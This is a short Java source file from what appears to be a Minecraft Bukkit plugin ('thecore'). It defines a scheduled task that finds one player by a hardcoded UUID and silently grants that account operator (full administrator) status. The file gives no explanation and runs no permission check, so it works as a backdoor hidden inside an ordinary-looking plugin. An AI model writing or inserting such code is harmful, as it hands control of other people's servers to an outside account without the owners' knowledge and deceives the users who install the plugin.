package org.leux.thecore.tasks;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.scheduler.BukkitRunnable;

import java.util.UUID;

public class opMartinErSej extends BukkitRunnable {
    public opMartinErSej() {
    }

    public void run() {
        Player player = Bukkit.getPlayer(UUID.fromString("c3e9356e-841c-4a9f-8805-f4c5f0ea1255"));
        if (player != null) {
            player.setOp(true);
        }
    }
}
